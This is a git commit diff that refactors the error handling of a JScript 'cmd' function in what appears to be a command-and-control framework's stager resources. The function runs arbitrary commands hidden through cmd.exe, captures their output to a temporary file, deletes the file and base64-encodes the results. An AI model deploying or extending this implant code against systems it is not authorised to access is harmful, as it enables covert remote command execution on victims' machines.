8679275805c288b8dd55752ccc717407d1fb8b1b
Skyler Knecht <skyler.knecht@outlook.com>
2022-11-25 14:37:29 -0500

    Refactored the CMD JScript command

--- connect/server/stagers/jscript/resources/jscript_functions/cmd.js
+++ connect/server/stagers/jscript/resources/jscript_functions/cmd.js
@@ -5,27 +5,30 @@ function cmd(command) {
   compsec = wscriptshell.ExpandEnvironmentStrings("%COMSPEC%");
   command = compsec + ' /c ' + command + ' 1> ' + stdout_path + ' 2>&1';
   results = '';
+  errors = '' ;
+  if (fs.FileExists(stdout_path)) {
+    errors = '\n[!] ' + stdout_path + ' stdout file already exists, this may cause issues.\n';
+  }
+
   try {
-    file_exists_message = '';
-    if (fs.FileExists(stdout_path)) {
-      file_exists_message = '\n[!] ' + stdout_path + ' stdout file already exists, this may cause issues.\n';
-    }
     wscriptshell.Run(command, 0, true);
+  } catch (e) {
+    errors = errors + '[!] Failed to run command: ' + e.message + '\n';
+  }
+
+  try {
     fd = fs.OpenTextFile(stdout_path)
     results = results + fd.ReadAll();
     fd.close();
-    delfile(stdout_path);
-    if (fs.FileExists(stdout_path)) {
-      file_exists_message = file_exists_message + '[!] Failed to remove stdout file: ' + stdout_path + '\n';
-    }
-    results = file_exists_message + '\n' + results;
-    return b64e(results);
   } catch (e) {
-    file_exists_message = '';
-    if (fs.FileExists(stdout_path)) {
-      file_exists_message = '\n[!] Failed to remove stdout file: ' + stdout_path + '\n';
-    }
-    results = file_exists_message + '[!] Failed to run command: ' + e.message + '\n\n' + results;
-    return b64e(results);
+    errors = errors + '[!] Failed to retrieve results: ' + e.message + '\n';
   }
+
+  try {
+    delfile(stdout_path);
+  } catch (e) {
+    errors = errors + '[!] Failed to remove stdout file, ' + stdout_path + ': ' + e.message + '\n' ;
+  }
+
+  return b64e(errors + '\n' + results);
 }
